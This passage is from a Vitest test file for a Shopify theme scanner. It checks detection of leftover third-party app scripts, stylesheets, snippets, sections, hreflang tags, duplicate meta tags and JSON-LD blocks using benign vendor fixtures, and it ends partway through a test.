import { FindingType, Severity } from "@prisma/client";
import { describe, it, expect } from "vitest";

import {
  CORE_STEP_OUTPUT_BUDGET_BYTES,
  JSONLD_PRICE_CANDIDATE_CAP,
} from "../../app/lib/scan-limits";
import type { CreateFindingInput } from "../../app/models/finding.server";
import {
  isScannableFile,
  detectGhostScripts,
  detectGhostStyles,
  detectGhostSnippets,
  detectGhostSections,
  detectGhostHrefLang,
  detectDuplicateMetaTags,
  detectGhostJsonLd,
  detectInvalidJsonLd,
  detectMaliciousScripts,
  blankLiquidComments,
  isMaliciousScanOnlyFile,
  collectUnknownScripts,
  collectUnknownStylesheets,
  detectJsonLdConflicts,
  extractStaticProductCandidates,
  detectGhostTextFragments,
  detectGhostPixels,
  detectSettingsDrift,
  detectGhostLayouts,
  detectGhostRobots,
  detectGhostCanonical,
  detectGhostTitle,
  detectGhostOg,
  detectGhostPreconnect,
  detectGhostFont,
  detectGhostAjax,
  detectDuplicateLibraries,
  detectDuplicateTrackers,
  detectOverlappingChatWidgets,
  scanThemeFiles,
  MAX_SCANNABLE_FILE_BYTES,
  type ThemeFile,
} from "../../app/services/scan-engine.server";
import { REFERENCE_THEMES, DAWN_TITLE, DAWN_META_TAGS } from "../fixtures/reference-themes";
import { timedMinMs, timedMinMsWithResult } from "../test-utils/timing";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Filter findings by type for cleaner assertions. */
function findingsOfType(findings: CreateFindingInput[], type: FindingType) {
  return findings.filter((f) => f.findingType === type);
}

// ---------------------------------------------------------------------------
// isScannableFile
// ---------------------------------------------------------------------------

describe("isScannableFile", () => {
  it("accepts liquid files in templates/", () => {
    expect(isScannableFile("templates/index.liquid")).toBe(true);
  });

  it("accepts liquid files in sections/", () => {
    expect(isScannableFile("sections/header.liquid")).toBe(true);
  });

  it("accepts liquid files in snippets/", () => {
    expect(isScannableFile("snippets/klaviyo-onsite.liquid")).toBe(true);
  });

  it("accepts liquid files in layout/", () => {
    expect(isScannableFile("layout/theme.liquid")).toBe(true);
  });

  it("accepts liquid files in blocks/ (OS 2.0 theme blocks, gc-zfl)", () => {
    expect(isScannableFile("blocks/group.liquid")).toBe(true);
    // Horizon's private (nested-only) blocks are underscore-prefixed.
    expect(isScannableFile("blocks/_header-menu.liquid")).toBe(true);
  });

  it("rejects non-liquid files in blocks/", () => {
    expect(isScannableFile("blocks/readme.md")).toBe(false);
  });

  it("rejects files in assets/ directory", () => {
    expect(isScannableFile("assets/theme.js")).toBe(false);
  });

  it("rejects files in config/ directory", () => {
    expect(isScannableFile("config/settings_data.json")).toBe(false);
  });

  it("rejects files in locales/ directory", () => {
    expect(isScannableFile("locales/en.default.json")).toBe(false);
  });

  it("rejects non-liquid files even in scannable directories", () => {
    expect(isScannableFile("templates/index.json")).toBe(false);
    expect(isScannableFile("sections/header.css")).toBe(false);
  });

  it("rejects empty string", () => {
    expect(isScannableFile("")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// detectGhostScripts
// ---------------------------------------------------------------------------

describe("detectGhostScripts", () => {
  it("detects a known app external script tag", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
    };
    const findings = detectGhostScripts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_SCRIPT);
    expect(findings[0].severity).toBe(Severity.HIGH);
    expect(findings[0].appName).toBe("Klaviyo");
    expect(findings[0].lineNumber).toBe(1);
    expect(findings[0].filename).toBe("layout/theme.liquid");
  });

  it("detects multiple scripts on different lines", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- tracking -->",
        '<script src="https://static.hotjar.com/c/hotjar-123.js"></script>',
        "<p>hello</p>",
        '<script src="https://code.tidio.co/abc.js"></script>',
      ].join("\n"),
    };
    const findings = detectGhostScripts(file);
    expect(findings).toHaveLength(2);
    expect(findings[0].lineNumber).toBe(2);
    expect(findings[1].lineNumber).toBe(4);
  });

  it("ignores scripts from unknown CDNs", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<script src="https://example.com/my-custom-script.js"></script>',
    };
    const findings = detectGhostScripts(file);
    expect(findings).toHaveLength(0);
  });

  it("ignores relative script paths", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "<script src=\"{{ 'theme.js' | asset_url }}\"></script>",
    };
    const findings = detectGhostScripts(file);
    expect(findings).toHaveLength(0);
  });

  it("downgrades script inside Liquid comment to LOW severity", () => {
    const file = {
      filename: "layout/theme.liquid",
      content:
        '{% comment %}\n<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>\n{% endcomment %}',
    };
    const findings = detectGhostScripts(file);
    // The snippet for line 2 includes line 1 (which has the comment opener)
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("returns correct description containing app name and URL", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
    };
    const findings = detectGhostScripts(file);
    expect(findings[0].description).toContain("Klaviyo");
    expect(findings[0].description).toContain("static.klaviyo.com");
  });

  it("handles protocol-relative URLs (//cdn.example.com)", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<script src="//static.klaviyo.com/onsite/js/klaviyo.js"></script>',
    };
    const findings = detectGhostScripts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Klaviyo");
  });
});

// ---------------------------------------------------------------------------
// detectGhostStyles
// ---------------------------------------------------------------------------

describe("detectGhostStyles", () => {
  it("detects a known app external stylesheet", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="stylesheet" href="https://cdn.judge.me/assets/v4/widget.css">',
    };
    const findings = detectGhostStyles(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_STYLE);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects stylesheet when href comes before rel", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link href="https://cdn.judge.me/assets/v4/widget.css" rel="stylesheet">',
    };
    const findings = detectGhostStyles(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("downgrades to LOW for print-only stylesheet", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="stylesheet" media="print" href="https://cdn.judge.me/print.css">',
    };
    const findings = detectGhostStyles(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("ignores internal stylesheets (relative URLs)", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="stylesheet" href="{{ \'theme.css\' | asset_url }}">',
    };
    const findings = detectGhostStyles(file);
    expect(findings).toHaveLength(0);
  });

  it("ignores stylesheets from unknown CDNs", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="stylesheet" href="https://example.com/style.css">',
    };
    const findings = detectGhostStyles(file);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// detectGhostSnippets
// ---------------------------------------------------------------------------

describe("detectGhostSnippets", () => {
  it("detects {% render %} of a known app snippet", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{% render 'klaviyo-onsite' %}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_SNIPPET);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
    expect(findings[0].appName).toBe("Klaviyo");
  });

  it("detects {% include %} of a known app snippet", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{% include 'klaviyo-form' %}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Klaviyo");
  });

  it("handles whitespace-stripping variant {%- render -%}", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{%- render 'klaviyo-onsite' -%}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
  });

  it("handles double-quoted snippet names", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '{% render "klaviyo-onsite" %}',
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
  });

  it("ignores snippets not in the signature database", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{% render 'my-custom-snippet' %}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(0);
  });

  it("detects Recharge snippet by name", () => {
    const file = {
      filename: "templates/product.liquid",
      content: "{% render 'recharge-checkout-option' %}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Recharge");
  });

  it("does NOT emit two findings when a {% render %} tag spans multiple lines", () => {
    // Regression for BLOCKING-1: RENDER_RE (full-content, \s* matches newlines)
    // and RENDER_LIQUID_BLOCK_RE (line-anchored) both matched multi-line render
    // tags, producing a duplicate GHOST_SNIPPET finding.
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "{%-\n  render 'klaviyo-onsite'\n-%}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Klaviyo");
  });

  it("still detects bare render inside {% liquid %} block as exactly one finding", () => {
    // Ensure RENDER_LIQUID_BLOCK_RE still fires for genuine bare-form calls
    // that are NOT inside a {% render %} tag (i.e., inside a {% liquid %} block).
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "{% liquid\n  render 'klaviyo-onsite'\n%}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Klaviyo");
  });

  it("emits two findings for two genuinely different render calls (no false dedup)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "{% render 'klaviyo-onsite' %}\n{% render 'recharge-checkout-option' %}",
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(2);
    const appNames = findings.map((f) => f.appName);
    expect(appNames).toContain("Klaviyo");
    expect(appNames).toContain("Recharge");
  });

  // GC-gmt: render/include tags inside an always-false conditional are dead code
  // (the block never renders) and must not be flagged as ghost references.
  describe("always-false conditional suppression (GC-gmt)", () => {
    it("does NOT flag a render tag inside {% if false %}", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["{% if false %}", "  {% render 'klaviyo-onsite' %}", "{% endif %}"].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(0);
    });

    it("still flags the same render tag when it is outside any conditional", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: "{% render 'klaviyo-onsite' %}",
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
    });

    it("does NOT flag a render tag inside {% unless true %}", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["{% unless true %}", "  {% render 'klaviyo-onsite' %}", "{% endunless %}"].join(
          "\n",
        ),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(0);
    });

    it("does NOT flag a render tag nested in an inner conditional inside {% if false %}", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "{% if false %}",
          "  {% if settings.show_form %}",
          "    {% render 'klaviyo-onsite' %}",
          "  {% endif %}",
          "{% endif %}",
        ].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(0);
    });

    it("handles whitespace-control variant {%- if false -%}", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["{%- if false -%}", "  {%- render 'klaviyo-onsite' -%}", "{%- endif -%}"].join(
          "\n",
        ),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(0);
    });

    it("STILL flags a render tag inside a non-always-false conditional like {% if foo %}", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "{% if settings.enable_klaviyo %}",
          "  {% render 'klaviyo-onsite' %}",
          "{% endif %}",
        ].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
    });

    it("STILL flags a render tag in the reachable {% else %} branch of an always-false block", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "{% if false %}",
          "  {% render 'recharge-checkout-option' %}",
          "{% else %}",
          "  {% render 'klaviyo-onsite' %}",
          "{% endif %}",
        ].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
    });

    it("STILL flags a render tag that follows an always-false block", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "{% if false %}",
          "  {% render 'recharge-checkout-option' %}",
          "{% endif %}",
          "{% render 'klaviyo-onsite' %}",
        ].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
    });
  });
});

// ---------------------------------------------------------------------------
// detectGhostSections
// ---------------------------------------------------------------------------

describe("shared comment skip covers LiquidDoc {% doc %} bodies", () => {
  const liveRender = "{% render 'judgeme_widgets' %}";

  it("does NOT flag an @example render inside a {% doc %} block", () => {
    const file: ThemeFile = {
      filename: "blocks/reviews.liquid",
      content: [
        "{% doc %}",
        "  Renders the review widget.",
        "  @param {string} product_id",
        "  @example",
        `  ${liveRender}`,
        "{% enddoc %}",
        '<div class="reviews"></div>',
      ].join("\n"),
    };
    expect(detectGhostSnippets(file)).toHaveLength(0);
  });

  it("does NOT flag a render inside a whitespace-controlled {%- doc -%} block", () => {
    const file: ThemeFile = {
      filename: "snippets/card.liquid",
      content: ["{%- doc -%}", `  @example ${liveRender}`, "{%- enddoc -%}"].join("\n"),
    };
    expect(detectGhostSnippets(file)).toHaveLength(0);
  });

  it("STILL flags the same render outside the doc block", () => {
    const file: ThemeFile = {
      filename: "blocks/reviews.liquid",
      content: ["{% doc %}", `  @example ${liveRender}`, "{% enddoc %}", liveRender].join("\n"),
    };
    const findings = detectGhostSnippets(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(4);
    expect(findings[0].findingType).toBe(FindingType.GHOST_SNIPPET);
  });

  it("STILL flags a render when there is no doc block at all", () => {
    expect(detectGhostSnippets({ filename: "blocks/r.liquid", content: liveRender })).toHaveLength(
      1,
    );
  });

  it("keeps comment-block skipping unchanged alongside doc skipping", () => {
    const file: ThemeFile = {
      filename: "sections/x.liquid",
      content: [
        "{% comment %}",
        liveRender,
        "{% endcomment %}",
        "{% doc %}",
        liveRender,
        "{% enddoc %}",
        liveRender,
      ].join("\n"),
    };
    const findings = detectGhostSnippets(file);
    expect(findings.map((f) => f.lineNumber)).toEqual([7]);
  });

  it("does NOT treat a {% docs %}-like tag or a doc variable as a doc block", () => {
    const file: ThemeFile = {
      filename: "sections/x.liquid",
      content: ["{% docs %}", "{{ doc }}", liveRender].join("\n"),
    };
    expect(detectGhostSnippets(file)).toHaveLength(1);
  });
});

describe("detectGhostSections", () => {
  it("detects {% section %} referencing a known app section name", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{% section 'shogun-head' %}",
    };
    const findings = detectGhostSections(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_SECTION);
    expect(findings[0].severity).toBe(Severity.LOW);
    expect(findings[0].appName).toBe("Shogun");
  });

  it("handles double-quoted section names", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '{% section "shogun-scripts" %}',
    };
    const findings = detectGhostSections(file);
    expect(findings).toHaveLength(1);
  });

  it("ignores sections not in the signature database", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{% section 'custom-hero-banner' %}",
    };
    const findings = detectGhostSections(file);
    expect(findings).toHaveLength(0);
  });

  it("handles whitespace-stripping variant", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{%- section 'pagefly-head' -%}",
    };
    const findings = detectGhostSections(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("PageFly");
  });

  it("does not flag a section tag inside a {% comment %} block", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        "  Old PageFly integration — removed 2024-01-15",
        "  {% section 'pagefly-head' %}",
        "{% endcomment %}",
        "<div>real content</div>",
      ].join("\n"),
    };
    const findings = detectGhostSections(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag a section tag on a line that also contains a Liquid conditional", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{% if settings.enable_shogun %}{% section 'shogun-head' %}{% endif %}",
    };
    const findings = detectGhostSections(file);
    expect(findings).toHaveLength(0);
  });

  it("still flags a real ghost section tag that is outside any comment or conditional", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        "  {% section 'shogun-head' %}",
        "{% endcomment %}",
        "{% section 'pagefly-head' %}",
      ].join("\n"),
    };
    const findings = detectGhostSections(file);
    // Only the one outside the comment block should be flagged
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("PageFly");
    expect(findings[0].lineNumber).toBe(4);
  });
});

// ---------------------------------------------------------------------------
// detectGhostHrefLang
// ---------------------------------------------------------------------------

describe("detectGhostHrefLang", () => {
  it("detects a Weglot hreflang tag (hreflang before href)", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="alternate" hreflang="fr" href="https://fr.example.com/products" />',
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_HREFLANG);
    expect(findings[0].severity).toBe(Severity.HIGH);
    expect(findings[0].appName).toBe("Weglot");
    expect(findings[0].lineNumber).toBe(1);
    expect(findings[0].description).toContain("fr");
    expect(findings[0].description).toContain("Weglot");
  });

  it("detects hreflang tag with href before hreflang", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="alternate" href="https://cdn.weglot.com/fr/page" hreflang="fr" />',
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Weglot");
    expect(findings[0].description).toContain("fr");
  });

  it("detects Transcy hreflang tags from transcy.io domain", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="alternate" hreflang="de" href="https://cdn.transcy.io/de/products" />',
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Transcy");
    expect(findings[0].description).toContain("de");
  });

  it("detects Langify hreflang tags from domain pattern", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="alternate" hreflang="es" href="https://cdn.langify-app.com/es/page" />',
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Langify");
  });

  it("detects LangShop hreflang tags from domain pattern", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="alternate" hreflang="ja" href="https://cdn.langshop.app/ja/page" />',
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("LangShop");
  });

  it("detects multiple hreflang tags on different lines", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<link rel="alternate" hreflang="fr" href="https://fr.example.com/" />',
        '<link rel="alternate" hreflang="de" href="https://de.example.com/" />',
      ].join("\n"),
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(2);
    expect(findings[0].lineNumber).toBe(1);
    expect(findings[1].lineNumber).toBe(2);
  });

  it("returns empty array for files with no hreflang tags", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "<html>{{ content_for_layout }}</html>",
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(0);
  });

  it("ignores hreflang tags with unrecognized href URLs", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<link rel="alternate" hreflang="fr" href="https://example.com/" />',
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(0);
  });

  it("downgrades to LOW when inside a Liquid comment", () => {
    const file = {
      filename: "layout/theme.liquid",
      content:
        '{% comment %}\n<link rel="alternate" hreflang="fr" href="https://fr.example.com/" />\n{% endcomment %}',
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("handles single-quoted attributes", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "<link rel='alternate' hreflang='fr' href='https://fr.example.com/' />",
    };
    const findings = detectGhostHrefLang(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Weglot");
  });
});

// ---------------------------------------------------------------------------
// detectDuplicateMetaTags
// ---------------------------------------------------------------------------

describe("detectDuplicateMetaTags", () => {
  it("finds duplicate <meta name='description'> tags in same file", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="description" content="First description">',
        "<p>some content</p>",
        '<meta name="description" content="Second description">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.DUPLICATE_META);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
    expect(findings[0].lineNumber).toBe(3);
    expect(findings[0].description).toContain("description");
    expect(findings[0].description).toContain("line 1");
  });

  it("finds duplicate <meta property='og:title'> tags (Open Graph)", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta property="og:title" content="First Title">',
        '<meta property="og:title" content="Second Title">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.DUPLICATE_META);
    expect(findings[0].description).toContain("og:title");
    expect(findings[0].description).toContain("line 1");
  });

  it("does NOT flag unique meta tags (no duplicates = no findings)", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="description" content="My shop">',
        '<meta property="og:title" content="My Title">',
        '<meta name="viewport" content="width=device-width">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(0);
  });

  it("handles mixed name and property attributes correctly", () => {
    // name="description" and property="description" should NOT be merged —
    // they are different attribute types. But two name="description" should match.
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="description" content="Name desc">',
        '<meta property="og:title" content="OG Title 1">',
        '<meta property="og:title" content="OG Title 2">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("og:title");
  });

  it("returns empty array for files with no meta tags", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "<html><body>{{ content_for_layout }}</body></html>",
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(0);
  });

  it("correctly identifies which occurrence is the duplicate (2nd+ occurrence)", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="robots" content="index, follow">',
        "<p>gap</p>",
        '<meta name="robots" content="noindex">',
        "<p>gap</p>",
        '<meta name="robots" content="nofollow">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    // Should flag line 3 and line 5 (2nd and 3rd occurrences), NOT line 1
    expect(findings).toHaveLength(2);
    expect(findings[0].lineNumber).toBe(3);
    expect(findings[0].description).toContain("line 1");
    expect(findings[1].lineNumber).toBe(5);
    expect(findings[1].description).toContain("line 1");
  });

  it("is case-insensitive for attribute values", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="Description" content="First">',
        '<meta name="description" content="Second">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(1);
  });

  it("handles meta tags with attributes in different order", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="description" content="First">',
        '<meta content="Second" name="description">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(1);
  });

  it("returns appName as undefined when no app signature matches", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="description" content="plain text">',
        '<meta name="description" content="another plain text">',
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBeUndefined();
  });

  it("does NOT flag duplicate metas inside {% unless %}/{% endunless %} block", () => {
    // Metas inside an unless block are mutually exclusive with the surrounding
    // context — they only render at runtime when the condition is false.
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% unless template == 'product' %}",
        '<meta name="description" content="First">',
        '<meta name="description" content="Second">',
        "{% endunless %}",
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag duplicate metas inside nested {% if %} blocks (depth > 1)", () => {
    // Tags inside deeply nested conditionals are branch-exclusive and must not
    // be counted against each other regardless of nesting depth.
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% if template == 'product' %}",
        "  {% if product.available %}",
        '  <meta name="description" content="Available product">',
        "  {% else %}",
        '  <meta name="description" content="Sold out product">',
        "  {% endif %}",
        "{% endif %}",
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag duplicate metas in different {% case %}/{% when %} branches", () => {
    // Each {% when %} branch is mutually exclusive — only one executes at runtime.
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% case template %}",
        "{% when 'product' %}",
        '<meta name="description" content="Product page">',
        "{% when 'collection' %}",
        '<meta name="description" content="Collection page">',
        "{% endcase %}",
      ].join("\n"),
    };
    const findings = detectDuplicateMetaTags(file);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// detectGhostJsonLd
// ---------------------------------------------------------------------------

describe("detectGhostJsonLd", () => {
  it("detects JSON-LD with Judge.me patterns", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "Product",
  "reviewCount": "42",
  "url": "https://judge.me/reviews/product123"
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_JSON_LD);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[0].description).toContain("Judge.me");
  });

  it("detects JSON-LD with Loox patterns", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "Product",
  "url": "https://loox.io/reviews/widget"
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Loox");
  });

  it("detects JSON-LD with FAQPage @type (no app match)", () => {
    const file = {
      filename: "sections/faq.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "FAQPage",
  "mainEntity": []
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_JSON_LD);
    expect(findings[0].appName).toBeUndefined();
    expect(findings[0].description).toContain("FAQPage");
  });

  it("detects JSON-LD with AggregateRating @type", () => {
    const file = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "AggregateRating",
  "ratingValue": "4.5"
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("AggregateRating");
  });

  it("skips JSON-LD blocks containing Liquid {{ template tags", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "Product",
  "name": "{{ product.title }}",
  "reviewCount": "42"
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(0);
  });

  it("skips JSON-LD blocks containing Liquid {% template tags", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "Product",
  {% if product.reviews_count > 0 %}
  "reviewCount": "42"
  {% endif %}
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(0);
  });

  it("skips legitimate static JSON-LD with no app patterns and no app-only @type", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "Organization",
  "name": "My Store",
  "url": "https://mystore.com"
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(0);
  });

  it("returns empty array for files with no JSON-LD", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "<html>{{ content_for_layout }}</html>",
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(0);
  });

  it("finds multiple JSON-LD blocks in one file independently", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "Product",
  "url": "https://judge.me/reviews"
}
</script>
<p>Some content</p>
<script type="application/ld+json">
{
  "@type": "FAQPage",
  "mainEntity": []
}
</script>`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(2);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[1].appName).toBeUndefined();
    expect(findings[1].description).toContain("FAQPage");
  });

  it("downgrades to LOW when inside a Liquid comment", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: `{% comment %}
<script type="application/ld+json">
{
  "@type": "Product",
  "url": "https://judge.me/reviews"
}
</script>
{% endcomment %}`,
    };
    const findings = detectGhostJsonLd(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });
});

// ---------------------------------------------------------------------------
// detectGhostTextFragments
// ---------------------------------------------------------------------------

describe("detectGhostTextFragments", () => {
  it("detects Judge.me widget markup", () => {
    const file = {
      filename: "sections/product.liquid",
      content: '<div id="jdgm-widget" class="review-widget"></div>',
    };
